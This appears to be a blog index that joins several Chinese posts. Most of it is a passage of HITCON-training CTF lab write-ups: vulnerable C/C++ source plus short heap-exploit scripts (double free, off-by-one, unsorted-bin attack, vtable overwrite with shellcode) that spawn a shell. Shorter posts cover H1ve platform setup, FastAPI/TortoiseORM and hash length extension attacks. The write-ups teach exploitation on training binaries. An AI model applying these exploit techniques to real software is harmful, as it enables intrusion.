setvbuf(stdout,0,2,0); signal(SIGALRM,handler); alarm(TIMEOUT);}int main(){ init(); int choice ; char buf[10]; while(1){ menu(); read(0,buf,8); choice = atoi(buf); switch(choice){ case 1: add(); break ; case 2: visit(); break ; case 3: del(); break ; case 4: clean(); break ; case 5: puts(&quot;See you next time.&quot;); exit(0); default : puts(&quot;Invalid choice&quot;); break ; } }} 在删除时存在double free，利用漏洞修改puts@got为magic即可。 1234567891011add(0x50) # 0add(0x50) # 1free(0)free(1)free(0)fake = 0x601ffaadd(0x50,p64(fake))add(0x50)add(0x50)add(0x50,flat('a'*6,0,elf.sym['magic'],elf.sym['magic'])) 另一种方法是直接getshell。先通过unsorted bin泄露libc，然后用同样的方法修改__malloc_hook为one_gadget，最后触发double free检测调用malloc_printerr，从而调用__malloc_hook。 1234567891011121314151617181920212223add(0x80)add(0x68)add(0x68)free(0)clean()add(0x80)show()ru('a'*8)base = uu64(r(6))-88-libc.sym['__malloc_hook']-0x10leak('base',base)malloc_hook = base+libc.sym['__malloc_hook']free(1)free(2)free(1)add(0x68,p64(malloc_hook-0x23))add(0x68)add(0x68)add(0x68,'a'*0x13+p64(base+one[2]))free(1)free(1) lab13 - heapcreator源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void read_input(char *buf,size_t size){ int ret ; ret = read(0,buf,size); if(ret &lt;=0){ puts(&quot;Error&quot;); _exit(-1); }}struct heap { size_t size ; char *content ;};struct heap *heaparray[10];void menu(){ puts(&quot;--------------------------------&quot;); puts(&quot; Heap Creator &quot;); puts(&quot;--------------------------------&quot;); puts(&quot; 1. Create a Heap &quot;); puts(&quot; 2. Edit a Heap &quot;); puts(&quot; 3. Show a Heap &quot;); puts(&quot; 4. Delete a Heap &quot;); puts(&quot; 5. Exit &quot;); puts(&quot;--------------------------------&quot;); printf(&quot;Your choice :&quot;);}void create_heap(){ int i ; char buf[8]; size_t size = 0; for(i = 0 ; i &lt; 10 ; i++){ if(!heaparray[i]){ heaparray[i] = (struct heap *)malloc(sizeof(struct heap)); if(!heaparray[i]){ puts(&quot;Allocate Error&quot;); exit(1); } printf(&quot;Size of Heap : &quot;); read(0,buf,8); size = atoi(buf); heaparray[i]-&gt;content = (char *)malloc(size); if(!heaparray[i]-&gt;content){ puts(&quot;Allocate Error&quot;); exit(2); } heaparray[i]-&gt;size = size ; printf(&quot;Content of heap:&quot;); read_input(heaparray[i]-&gt;content,size); puts(&quot;SuccessFul&quot;); break ; } }}void edit_heap(){ int idx ; char buf[4]; printf(&quot;Index :&quot;); read(0,buf,4); idx = atoi(buf); if(idx &lt; 0 || idx &gt;= 10){ puts(&quot;Out of bound!&quot;); _exit(0); } if(heaparray[idx]){ printf(&quot;Content of heap : &quot;); read_input(heaparray[idx]-&gt;content,heaparray[idx]-&gt;size+1); puts(&quot;Done !&quot;); }else{ puts(&quot;No such heap !&quot;); }}void show_heap(){ int idx ; char buf[4]; printf(&quot;Index :&quot;); read(0,buf,4); idx = atoi(buf); if(idx &lt; 0 || idx &gt;= 10){ puts(&quot;Out of bound!&quot;); _exit(0); } if(heaparray[idx]){ printf(&quot;Size : %ld\\nContent : %s\\n&quot;,heaparray[idx]-&gt;size,heaparray[idx]-&gt;content); puts(&quot;Done !&quot;); }else{ puts(&quot;No such heap !&quot;); }}void delete_heap(){ int idx ; char buf[4]; printf(&quot;Index :&quot;); read(0,buf,4); idx = atoi(buf); if(idx &lt; 0 || idx &gt;= 10){ puts(&quot;Out of bound!&quot;); _exit(0); } if(heaparray[idx]){ free(heaparray[idx]-&gt;content); free(heaparray[idx]); heaparray[idx] = NULL ; puts(&quot;Done !&quot;); }else{ puts(&quot;No such heap !&quot;); }}int main(){ char buf[4]; setvbuf(stdout,0,2,0); setvbuf(stdin,0,2,0); while(1){ menu(); read(0,buf,4); switch(atoi(buf)){ case 1 : create_heap(); break ; case 2 : edit_heap(); break ; case 3 : show_heap(); break ; case 4 : delete_heap(); break ; case 5 : exit(0); break ; default : puts(&quot;Invalid Choice&quot;); break; } } return 0 ;} 本题添加堆时没有检查size，可以整数溢出；编辑堆时存在人为设置的off by one，因此可以覆盖下一个chunk的chunk_size造成堆块重叠。我们先申请0x18的chunk，需要注意必须以8结尾以覆盖到chunk_size，然后申请0x10的victim，利用off by one修改victim的chunk_size为0x41后，释放victim。 我们知道，原来的victim指针是0x20的chunk，victim的内容也是0x20的chunk。现在victim指针变成了0x40，那么我们可以申请0x30的chunk，使得新chunk内容使用的是victim的指针chunk，而新chunk的指针使用的是victim的内容chunk。这样我们就能控制整个victim了。确保指针内的heapsize合法，然后在content对应位置放上要泄露/覆盖的函数GOT，通过libc泄露得到system，最后用system劫持GOT即可。 1234567891011121314add(0x18) # 0add(0x10) # 1edit(0,'a'*0x18+'\\x41')delete(1)# new heap-&gt;content = heap1-&gt;ptr# new heap-&gt;ptr = heap1-&gt;contentadd(0x30,flat(0,0,0,0,0x30,elf.got['atoi']))show(1)ru('Content : ')atoi = uu64(r(6))system,binsh = ret2libc(atoi,'atoi')edit(1,p64(system))sla('choice :','sh\\x00\\x00') lab14 - magicheap源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void read_input(char *buf,size_t size){ int ret ; ret = read(0,buf,size); if(ret &lt;=0){ puts(&quot;Error&quot;); _exit(-1); }}char *heaparray[10];unsigned long int magic = 0 ;void menu(){ puts(&quot;--------------------------------&quot;); puts(&quot; Magic Heap Creator &quot;); puts(&quot;--------------------------------&quot;); puts(&quot; 1. Create a Heap &quot;); puts(&quot; 2. Edit a Heap &quot;); puts(&quot; 3. Delete a Heap &quot;); puts(&quot; 4. Exit &quot;); puts(&quot;--------------------------------&quot;); printf(&quot;Your choice :&quot;);}void create_heap(){ int i ; char buf[8]; size_t size = 0; for(i = 0 ; i &lt; 10 ; i++){ if(!heaparray[i]){ printf(&quot;Size of Heap : &quot;); read(0,buf,8); size = atoi(buf); heaparray[i] = (char *)malloc(size); if(!heaparray[i]){ puts(&quot;Allocate Error&quot;); exit(2); } printf(&quot;Content of heap:&quot;); read_input(heaparray[i],size); puts(&quot;SuccessFul&quot;); break ; } }}void edit_heap(){ int idx ; char buf[4]; size_t size ; printf(&quot;Index :&quot;); read(0,buf,4); idx = atoi(buf); if(idx &lt; 0 || idx &gt;= 10){ puts(&quot;Out of bound!&quot;); _exit(0); } if(heaparray[idx]){ printf(&quot;Size of Heap : &quot;); read(0,buf,8); size = atoi(buf); printf(&quot;Content of heap : &quot;); read_input(heaparray[idx] ,size); puts(&quot;Done !&quot;); }else{ puts(&quot;No such heap !&quot;); }}void delete_heap(){ int idx ; char buf[4]; printf(&quot;Index :&quot;); read(0,buf,4); idx = atoi(buf); if(idx &lt; 0 || idx &gt;= 10){ puts(&quot;Out of bound!&quot;); _exit(0); } if(heaparray[idx]){ free(heaparray[idx]); heaparray[idx] = NULL ; puts(&quot;Done !&quot;); }else{ puts(&quot;No such heap !&quot;); }}void l33t(){ system(&quot;cat /home/magicheap/flag&quot;);}int main(){ char buf[8]; setvbuf(stdout,0,2,0); setvbuf(stdin,0,2,0); while(1){ menu(); read(0,buf,8); switch(atoi(buf)){ case 1 : create_heap(); break ; case 2 : edit_heap(); break ; case 3 : delete_heap(); break ; case 4 : exit(0); break ; case 4869 : if(magic &gt; 4869){ puts(&quot;Congrt !&quot;); l33t(); }else puts(&quot;So sad !&quot;); break ; default : puts(&quot;Invalid Choice&quot;); break; } } return 0 ;} 在edit时没有检查size，可以堆溢出。题目要求bss段的magic大于0x1305，且输入数字等于0x1305，即可getshell。那么我们释放一个chunk到unsorted bin，利用堆溢出修改其bk为magic-0x10，再申请回来，那么magic就会被认为是下一个unsorted chunk的fd，被填入main_arena+88，这个值远超0x1305。 123456789101112add(0x10) # 0add(0x80) # 1add(0x10) # 2delete(1)magic = 0x6020a0fd = 0bk = magic-0x10payload = flat('a'*0x10,0,0x91,fd,bk)edit(0,len(payload),payload)add(0x80)sla(':',str(0x1305)) lab15 - zoo源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184#include &lt;stdio.h&gt;#include &lt;iostream&gt;#include &lt;unistd.h&gt;#include &lt;vector&gt;#include &lt;string.h&gt;using namespace std;char nameofzoo[100];class Animal { public : Animal(){ memset(name,0,24); weight = 0; } virtual void speak(){;} virtual void info(){;} protected : char name[24]; int weight;};class Dog : public Animal{ public : Dog(string str,int w){ strcpy(name,str.c_str()); weight = w ; } virtual void speak(){ cout &lt;&lt; &quot;Wow ~ Wow ~ Wow ~&quot; &lt;&lt; endl ; } virtual void info(){ cout &lt;&lt; &quot;|---------------------|&quot; &lt;&lt; endl ; cout &lt;&lt; &quot;| Animal info |&quot; &lt;&lt; endl; cout &lt;&lt; &quot;|---------------------|&quot; &lt;&lt; endl; cout &lt;&lt; &quot; Weight :&quot; &lt;&lt; this-&gt;weight &lt;&lt; endl ; cout &lt;&lt; &quot; Name : &quot; &lt;&lt; this-&gt;name &lt;&lt; endl ; cout &lt;&lt; &quot;|---------------------|&quot; &lt;&lt; endl; }};class Cat : public Animal{ public : Cat(string str,int w){ strcpy(name,str.c_str()); weight = w ; } virtual void speak(){ cout &lt;&lt; &quot;Meow ~ Meow ~ Meow ~&quot; &lt;&lt; endl ; } virtual void info(){ cout &lt;&lt; &quot;|---------------------|&quot; &lt;&lt; endl ; cout &lt;&lt; &quot;| Animal info |&quot; &lt;&lt; endl; cout &lt;&lt; &quot;|---------------------|&quot; &lt;&lt; endl; cout &lt;&lt; &quot; Weight :&quot; &lt;&lt; this-&gt;weight &lt;&lt; endl ; cout &lt;&lt; &quot; Name : &quot; &lt;&lt; this-&gt;name &lt;&lt; endl ; cout &lt;&lt; &quot;|---------------------|&quot; &lt;&lt; endl; }};vector&lt;Animal *&gt; animallist ;void menu(){ cout &lt;&lt; &quot;*********************************&quot; &lt;&lt; endl ; cout &lt;&lt; &quot; 1. Add a dog &quot; &lt;&lt; endl ; cout &lt;&lt; &quot; 2. Add a cat &quot; &lt;&lt; endl ; cout &lt;&lt; &quot; 3. Listen a animal &quot; &lt;&lt; endl ; cout &lt;&lt; &quot; 4. Show a animal info &quot; &lt;&lt; endl ; cout &lt;&lt; &quot; 5. Remove a animal &quot; &lt;&lt; endl ; cout &lt;&lt; &quot; 6. Exit &quot; &lt;&lt; endl ; cout &lt;&lt; &quot;*********************************&quot; &lt;&lt; endl ;}void adddog(){ string name ; int weight ; cout &lt;&lt; &quot;Name : &quot; ; cin &gt;&gt; name; cout &lt;&lt; &quot;Weight : &quot; ; cin &gt;&gt; weight ; Dog *mydog = new Dog(name,weight); animallist.push_back(mydog);}void addcat(){ string name ; int weight ; cout &lt;&lt; &quot;Name : &quot; ; cin &gt;&gt; name; cout &lt;&lt; &quot;Weight : &quot; ; cin &gt;&gt; weight ; Cat *mycat = new Cat(name,weight); animallist.push_back(mycat);}void remove(){ unsigned int idx ; if(animallist.size() == 0){ cout &lt;&lt; &quot;no any animal!&quot; &lt;&lt; endl ; return ; } cout &lt;&lt; &quot;index of animal : &quot;; cin &gt;&gt; idx ; if(idx &gt;= animallist.size()){ cout &lt;&lt; &quot;out of bound !&quot; &lt;&lt; endl; return ; } delete animallist[idx]; animallist.erase(animallist.begin()+idx);}void showinfo(){ unsigned int idx ; if(animallist.size() == 0){ cout &lt;&lt; &quot;no any animal!&quot; &lt;&lt; endl ; return ; } cout &lt;&lt; &quot;index of animal : &quot;; cin &gt;&gt; idx ; if(idx &gt;= animallist.size()){ cout &lt;&lt; &quot;out of bound !&quot; &lt;&lt; endl; return ; } animallist[idx]-&gt;info();}void listen(){ unsigned int idx ; if(animallist.size() == 0){ cout &lt;&lt; &quot;no any animal!&quot; &lt;&lt; endl ; return ; } cout &lt;&lt; &quot;index of animal : &quot;; cin &gt;&gt; idx ; if(idx &gt;= animallist.size()){ cout &lt;&lt; &quot;out of bound !&quot; &lt;&lt; endl; return ; } animallist[idx]-&gt;speak();}int main(void){ unsigned int choice ; setvbuf(stdout,0,2,0); setvbuf(stdin,0,2,0); cout &lt;&lt; &quot;Name of Your zoo :&quot; ; read(0,nameofzoo,100); while(1){ menu(); cout &lt;&lt; &quot;Your choice :&quot;; cin &gt;&gt; choice ; cout &lt;&lt; endl ; switch(choice){ case 1 : adddog(); break ; case 2 : addcat(); break ; case 3 : listen(); break ; case 4 : showinfo(); break ; case 5 : remove(); break ; case 6 : _exit(0); default : cout &lt;&lt; &quot;Invaild choice&quot; &lt;&lt; endl; break ; } } return 0 ;} 在Dog和Cat的构造函数中存在未检查长度的strcpy，因此可以堆溢出。同时，本题关闭了NX，而Dog中存在虚表指针，因此可以将其覆盖为shellcode地址的地址。那么shellcode和shellcode地址分别在哪呢？我们可以在程序第一次输入时布置shellcode，在后面跟上shellcode所在地址。 12345678910name = 0x605420shellcode = asm(shellcraft.sh())sla('zoo',shellcode+p64(name))add()add()free(0)add('a'*72+p64(name+len(shellcode)))sla('choice :',3)sla(':',0)","link":"/post/HITCONtraining/"},{"title":"H1ve 部署实践","text":"最近 H1ve 平台开源了，这是我在 github 上见到的目前完成度最高的平台。尽管如此依然遇到了不少 bug，经修复后现在的版本还算稳定。 平台基于 CTFd，解题赛使用 CTFd-owl 插件，攻防赛使用 CTFd-Glowworm 插件。 技术架构 盗了张图，这里是 BUUCTF 的架构，与 H1ve 搭建的架构类似，仅仅是将 CTFd-Whale 替换成了 CTFd-Owl（前者使用 docker-swarm 而后者使用 docker-compose）。 操作步骤首先是第一次运行需要 setup，随便设置一个管理员账号就行。随后添加用户，因为管理员用户比较特殊，在进行参赛、提交等操作时会出问题。接着在 config 的 time 里设置一个比赛开始时间，这一点十分重要，否则后续在 glowworm 里点击init competition会出错。 接下来开始添加题目。在此之前先要配置好插件。 OwlDocker Settings 里可以设置： flag 前缀 Docker API，可以使用默认的unix://var/run/docker.sock 最大容器数量，默认没有限制，不建议使用默认值 单个容器最大续期次数 FRP Settings 里可以设置： FRP 域名后缀，用于动态域名转发，如果直接使用 IP 的话就不需要填了 FRP 服务器 IP，使用单个服务器一般填0.0.0.0，但是试了一下也可以填域名 FRP 最小/最大端口，记得防火墙开放相应端口 FRP 配置模板 配置模板可以直接使用默认配置： 123456[common]token = random_thisserver_addr = frpsserver_port = 80admin_addr = 0.0.0.0admin_port = 7400 解题赛添加题目 题目类型：dynamic_check_docker 部署方式：single_docker_compose 题目路径：相对于source目录的路径 FRP 类型：IP 访问用DIRECT，域名访问用http FRP 端口：题目在 docker 中的内网端口，这里我使用的是 web 题 80，pwn 题 10000 题目名称 题目所属分类：web/pwn/misc/crypto/reverse/… 题目描述 题目初始分数 题目最低分数 达到最低分数所需的正确提交次数 最大尝试次数，0 为无限制 题目是否可见 题目创建后可以在题目详情页左侧查看正确提交、手动更新 flag、上传附件、设置标签、添加提示、设置前置解题要求等等。 GlowwormCompetition Settings 里可以设置： Docker API，可以使用默认的unix://var/run/docker.sock 服务器 IP，使用单个服务器一般填0.0.0.0 容器 root 用户的密码 每轮时间（秒） 是否开启随机端口 攻防赛添加题目 题目类型：ada_challenge 题目路径：相对于ctfd_glowworm目录的路径 题目在 dockerhub 上的镜像名（这种方式会更方便一些） CPU 限制，默认 0.5 内存限制，默认 512M 容器端口：容器在 docker 中的内网端口 题目所属分类：web1/pwn1/web2/pwn2/…，不可重复 题目语言：Django/PHP/Node/PWN 题目描述 攻击分数 checker 分数 添加完后，确保 config 的 time 里设置好了开始时间，随后进入插件的 Environments 页面点击init competition，然后对每道题依次Build-&gt;Run-&gt;Check。 题目模板只有 web 和 pwn 需要部署靶机，pwn 题比较容易。参考BUUCTF 题目贡献指南，首先新建目录，把二进制文件放进去命名为pwn，然后编写Dockerfile： 12FROM glzjin/pwn_base_18COPY pwn /pwn/pwn 其中glzjin/pwn_base_x代表 Ubuntu x.04，x 可以是 16/18/19/20。 然后编写docker-compose.yml： 1234567891011121314151617version: &quot;2&quot;services: service: build: . image: pwn1 ports: - 9999:10000 volumes: - &quot;$PWD/flag:/pwn/flag&quot; tty: true networks: - netnetworks: net: external: name: h1ve_frp_containers 如果修改了ports里的9999，则需要对 H1ve 源码进行对应的修改，因为源码中直接将 9999 替换为随机的端口号。 web 的话就不能偷懒了，需要自己写Dockerfile。随后编写docker-compose.yml，这里放一个官方的例子： 1234567891011121314151617181920212223version: &quot;2&quot;services: # 基本环境 service: # 容器名字 # build 该置顶目录下的dockerfile build: . # image指定build Dockerfile生成镜像的名称 image: 0akarma-file-upload ports: - 9999:80 volumes: # 挂载的 Flag - &quot;$PWD/flag:/var/www/html/include/flag:ro&quot; - &quot;$PWD/apache2.conf:/etc/apache2/apache2.conf&quot; tty: true networks: - netnetworks: # 配置docker network net: external: name: h1ve_frp_containers ports这里和 pwn 题同理，volumes下可以按需挂载需要的文件。 题目构建好后，就可以 Launch instance 测试一下了，第一次运行的话可能会比较慢。 坑点redis我没接触过 redis 所以不太懂，但是在 MetasequoiaCTF 比赛过程中平台大约每 2 个多小时会崩一次，原因就在于 redis 达到了最大连接数。用redis-cli查看info clients发现连接数持续增长，到了默认的maxclients也就是10000的时候平台就没了。 我尝试设置config set timeout 600，但是似乎不起作用，依然有些连接的idle时间超过 600。暂时的解决方案是： 123456$ ulimit -Sn 100000$ redis-cli127.0.0.1:6379&gt; config set timeout 600OK127.0.0.1:6379&gt; config set maxclients 100000OK 这样以后貌似情况有所改观，当然也可能是我的错觉。。 Freeze 功能这个错误就比较低级了，设置好 Freeze 时间后计分板坏了。错误位于H1ve/CTFd/plugins/ctfd-matrix-scoreboard/__init__.py:56： 123456freeze = utils.get_config('freeze')if freeze: freeze = CTFd.utils.unix_time_to_utc(freeze) if teamid != session.get('id'): basic_solves = basic_solves.filter(Solves.date &lt; freeze)basic_solves = basic_solves.all() 把CTFd.utils去掉就不会报错了，因为之前已经有： 1from CTFd.utils.dates import unix_time_to_utc","link":"/post/H1veDeploy/"},{"title":"FastAPI + TortoiseORM 实现异步 DB 操作","text":"参考了这个repo和官方文档，踩了一些坑后觉得有必要记录下来。 目录结构1234567891011app/|--app.db|--requirements.txt|--initialize.py|--main.py|--Database/| |--models.py|--Projects/| |--crud.py| |--projects.py| |--schemas.py 无关目录未列出。 初始化首先在 main.py 中对初始化流程进行了封装： 12345678910111213from fastapi import FastAPIfrom Config.openapi import title, desc, version, docs_urlfrom initializer import initapp = FastAPI( title=title, description=desc, version=version, docs_url=docs_url)init(app) 在 init() 中会执行许多初始化操作： 12345def init(app: FastAPI): init_middleware(app) init_db(app) init_routers(app) # ... 注意这里 init_routers() 在 init_db() 后面执行，之后会提到这样做的好处。而 init_db() 函数比较简单： 1234567891011121314from fastapi import FastAPIfrom tortoise import Tortoisefrom tortoise.contrib.fastapi import register_tortoisefrom Config import tortoisedef init_db(app: FastAPI): register_tortoise( app, db_url=tortoise.db_url, generate_schemas=tortoise.gen_schemas, modules=tortoise.modules ) Tortoise.init_models(['Database.models'], 'models') Tortoise ORM 提供了 register-tortoise 函数，方便我们在服务器启动和关闭时，对 ORM 服务进行启动、关闭。这里传入的配置如下： 123db_url = &quot;sqlite://app.db&quot;gen_schemas = Truemodules = {&quot;models&quot;: [&quot;Database.models&quot;]} 测试环境下采用 sqlite3 作为数据库，并声明自动生成数据库 schemas。在 modules 中，指定 app_name 为 models，告诉 Tortoise 到 Database.models 文件中寻找需要的数据库模型。 最后，需要注意主动调用 init_models 方法进行 Early-init，这是为了保证 Database.models 中的模型都能被及时初始化。否则，生成的 Pydantic Models 极有可能会丢失 Relations 相关的字段。 关于这一点，文档中给出了更详尽的描述。 遗憾的是，文档中 FastAPI Examples 部分并没有体现该问题，因为给出的例子没有用到 Relations 相关 API，不受影响。 定义数据库模型Tortoise ORM 能够很好的支持 Pydantic，甚至可以直接通过定义的数据库模型生成 Pydantic Models，并提供额外的模型转换方法。 这里我们以比较简单的 Project 对象为例，在 Database/models.py 中创建模型： 123456from tortoise.fields import IntField, CharField, DatetimeField, ForeignKeyFieldfrom tortoise.models import Modelclass Projects(Model): id = IntField(pk=True) name = CharField(255) 由于对于每个 Project 都可能发起多次 Scan ，定义 Scan 模型时可以使用一个外键约束： 12345678class Scans(Model): id = IntField(pk=True) type = CharField(30) target = CharField(255) status = CharField(10) created_at = DatetimeField(auto_now_add=True) project = ForeignKeyField('models.Projects', related_name='scans') 外键约束的格式是 {app_name}.{model_name}，参数 related_name 代表在 Project 中查询对应的 Scan 时所使用的名字。这样在查询中就可以用 Scans.project 和 Projects.scans 进行正反向引用了。 实际上，这里的 project 字段在数据库中被替代为 project_id，查询 Scans 时会根据得到的 project_id 继续在 Projects 表中查询结果，毫无疑问这会带来额外的开销，但同时也提高了开发效率。 定义 Pydantic Models接下来在 Projects/schemas.py 中创建 Pydantic Models，Scans 同理： 123456from Database.models import Projectsfrom tortoise.contrib.pydantic import pydantic_model_creatorProject = pydantic_model_creator(Projects, name='Project')ProjectIn = pydantic_model_creator( Projects, name='ProjectIn', exclude_readonly=True) 为什么要在 Projects.schemas 下才创建 Pydantic Models？因为上文提到，我们必须确保在 Tortoise.init_models() 执行后，才执行 pydantic_model_creator()。由于 Projects/ 目录下的内容会在 init_router() 中执行，因此将 init_router() 放在 init_db() 后就能够确保这一点。 这样以后，大概可以得到 Project 的结构如下： 12345{ id: int, name: str, scans: List[Scan]} 而 Scan 的结构如下： 12345678{ id: int, type: str, target: str, status: str, created_at: Datetime, project: Project} 容易发现这里出现了一个递归引用的问题，好在 Tortoise ORM 会自动帮我们解决这类问题。真正的问题在于：虽然对 Scan 进行 CRUD 时，常常会需要其对应的 Project，但对 Project 进行 CRUD 时，通常不需要了解它对应着哪些 Scan，而是关心其本身的属性。 因此我们重新定义 Database.models.Projects，让它不再返回 scans 字段: 123456class Projects(Model): id = IntField(pk=True) name = CharField(255) class PydanticMeta: exclude = ['scans'] 这里的 PydanticMeta 类对于配置自动生成的 Pydantic Models 非常有用，然而目前文档尚不完善，因此记录一下可选的配置： 123456789101112131415161718192021222324252627282930313233343536373839404142class PydanticMeta: &quot;&quot;&quot; The ``PydanticMeta`` class is used to configure metadata for generating the pydantic Model. Usage: .. code-block:: python3 class Foo(Model): ... class PydanticMeta: exclude = (&quot;foo&quot;, &quot;baa&quot;) computed = (&quot;count_peanuts&quot;, ) &quot;&quot;&quot; #: If not empty, only fields this property contains will be in the pydantic model include: Tuple[str, ...] = () #: Fields listed in this property will be excluded from pydantic model exclude: Tuple[str, ...] = () #: Computed fields can be listed here to use in pydantic model computed: Tuple[str, ...] = () #: Use backward relations without annotations - not recommended, it can be huge data #: without control backward_relations: bool = True #: Maximum recursion level allowed max_recursion: int = 3 #: Allow cycles in recursion - This can result in HUGE data - Be careful! #: Please use this with ``exclude``/``include`` and sane ``max_recursion`` allow_cycles: bool = False #: If we should exclude raw fields (the ones have _id suffixes) of relations exclude_raw_fields: bool = True #: Sort fields alphabetically. #: If not set (or ``False``) then leave fields in declaration order sort_alphabetically: bool = False 编写简单 CRUD正确进行配置后，可以尝试写 CRUD 来进行测试了： 12345678910111213141516171819202122232425from Database.models import Projectsfrom .schemas import Project, ProjectInasync def get_all(): return await Project.from_queryset(Projects.all())async def get(id: int): return await Project.from_queryset_single(Projects.get(id=id))async def create(param: ProjectIn): target = await Projects.create(**param.dict()) return await Project.from_tortoise_orm(target)async def edit(id: int, param: ProjectIn): await Projects.get(id=id).update(**param.dict()) returnasync def delete(id: int): await Projects.get(id=id).delete() return Tortoise ORM 生成的 Pydantic Models 可以使用类似 from_queryset() 之类的方法来转换数据库查询得到的结果，十分方便。","link":"/post/FastAPITortoise/"},{"title":"哈希长度扩展攻击","text":"简单翻译了hash_extender的README文档。 背景哈希长度扩展攻击是对消息认证码MAC的攻击，我们令其中使用的哈希函数为H，则该攻击针对的是形如H(secret || data)这类MAC，其中||是连接符。容易受到攻击的哈希函数包括但不限于： MD4 MD5 RIPEMD-160 SHA-0 SHA-1 SHA-256 SHA-512 WHIRLPOOL 然而，MD2/SHA-224/SHA-384不会受到该攻击。 攻击者在不知道secret的情况下，仍能产生合法的H(secret || data || attacker_controlled_data)的值。这是由于上述易受攻击的哈希函数都拥有类似“断点续传”的能力：即上一轮哈希函数的输出所包含的信息，足以用来继续进行下一轮哈希计算。攻击者所做的，不过是接手了继续计算哈希的任务而已。 简而言之，给定一个“一个未知前缀+一个字符串”的哈希值，攻击者可以在字符串后加上任意后缀，生成新的哈希值而不改变原来的未知前缀。 例子12345secret = 'secret'data = 'data'H = md5()signature = H(secret || data) = 6036708eba0d11f6ef52ad44e8b74d5bappend = 'append' 服务器将data和signature发送到客户端，攻击者可以猜测（或通过其他方式）使用的哈希函数为MD5，因为返回的哈希值长32位，而MD5是最常用的128-bit哈希函数。 已知data，signature，H这三个参数，攻击者想要将append添加到data后面，然后生成新的合法哈希值，要怎么做呢？ 填充在讨论实际的攻击前，不得不先说说哈希函数中的填充问题。 计算H(secret || data)时，字符串secret || data会被填充，填充使用的是一位1和若干位0，紧随其后的是十六进制表示的字符串的长度。也就是一个0x80字节，加上若干个0x00字节，再加上表示长度的若干字节。后两者的字节数，以及长度如何表示，取决于具体的哈希函数和分组的大小。 对于大多数哈希函数（包括MD4,MD5,RIPEMD-160,SHA-0,SHA-1和SHA-256），字符串会被填充至长度len，使得len===56(mod 64)字节，也就是比分组大小64字节少8字节。少掉的8字节用来存放长度。hash_extender中有两个例外：SHA-512分组大小为128字节、并用16字节表示长度；WHIRLPOOL分组大小为64字节、并用32字节表示长度。 此外，MD4,MD5,RIPEMD-160使用小端法表示长度，而SHA家族和WHIRLPOOL用大端法。 在我们的例子中，len(secret || data) = len('secretdata') = 10字节，或者说80(0x50)位。于是我们有：10字节的数据secretdata，46字节填充0x80 0x00 0x00 ...，以及8字节小端法表示的长度字段50 00 00 00 00 00 00 00，共64字节： 12340000 73 65 63 72 65 74 64 61 74 61 80 00 00 00 00 00 secretdata......0010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................0020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................0030 00 00 00 00 00 00 00 00 50 00 00 00 00 00 00 00 ........P....... 攻击现在我们有了要哈希的数据，我们来看看如何实现攻击。 首先我们把append加到后面，很简单： 123450000 73 65 63 72 65 74 64 61 74 61 80 00 00 00 00 00 secretdata......0010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................0020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................0030 00 00 00 00 00 00 00 00 50 00 00 00 00 00 00 00 ........P.......0040 61 70 70 65 6e 64 append 这样一块数据的哈希值是我们最终想要： 计算出来的 让服务器计算的 要计算该哈希值，有两种方法： 放进一个buffer里，然后调用H(buffer) 从第一个分组的末尾开始，使用我们从signature中已知的状态信息，然后从那个状态开始对append作哈希运算 第一种方法是服务器将采用的，而第二种就是攻击者要采用的。我们先看服务器端，因为更简单一点。 服务器端计算我们知道服务器会把secret放到字符串前面，所以我们把去掉secret后的消息发过去： 12340000 64 61 74 61 80 00 00 00 00 00 00 00 00 00 00 00 data............0010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................0020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................0030 00 00 50 00 00 00 00 00 00 00 61 70 70 65 6e 64 ..P.......append 注意到这里的数据正好64字节——不要被迷惑了，这只是因为secret和append正好长度相同的关系。或许我不应该选这个例子，但我懒得重来了。。 服务器把secret作为前缀： 123450000 73 65 63 72 65 74 64 61 74 61 80 00 00 00 00 00 secretdata......0010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................0020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................0030 00 00 00 00 00 00 00 00 50 00 00 00 00 00 00 00 ........P.......0040 61 70 70 65 6e 64 append 然后计算得到哈希值： 16ee582a1669ce442f3719c47430dadee 你可以用如下代码验证： 1234567891011121314151617181920212223242526#include &lt;stdio.h&gt;#include &lt;openssl/md5.h&gt;int main(int argc, const char *argv[]){ MD5_CTX c; unsigned char buffer[MD5_DIGEST_LENGTH]; int i; MD5_Init(&amp;c); MD5_Update(&amp;c, &quot;secret&quot;, 6); MD5_Update(&amp;c, &quot;data&quot; &quot;\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; &quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; &quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; &quot;\\x00\\x00\\x00\\x00&quot; &quot;\\x50\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; &quot;append&quot;, 64); MD5_Final(buffer, &amp;c); for (i = 0; i &lt; 16; i++) { printf(&quot;%02x&quot;, buffer[i]); } printf(&quot;\\n&quot;); return 0;} 运行： 123$ gcc -o hash_extension_1 hash_extension_1.c -lssl -lcrypto$ ./hash_extension_1 